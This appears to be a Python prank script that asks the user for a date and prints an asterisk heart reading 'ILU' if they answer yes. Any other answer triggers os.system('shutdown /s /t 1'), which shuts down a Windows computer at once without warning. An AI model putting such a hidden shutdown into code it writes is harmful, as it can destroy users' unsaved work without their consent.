import os

a = input("Will you come for Date?...:) (y/n)")
a = a.lower()
if a=="y":
    for row in range(6):
        for col in range(7):
            if (row == 0 and col % 3 != 0) or (row == 1 and col % 3 == 0) or (row - col == 2) or (row + col == 8):
                print("*", end=" ")
            elif(row==2 and col==1):
                print(" ", end=" ")
            elif (row == 2 and col == 2):
                print("I", end=" ")
            elif (row == 2 and col == 3):
                print("L", end=" ")
            elif (row == 2 and col == 4):
                print("U", end=" ")
            elif (row == 2 and col == 5):
                print(" ", end=" ")
            else:
                print(" ", end=" ")
        print("\r")
    
else:
    os.system("shutdown /s /t 1") 
    print("Bye bye.........................:(")
    
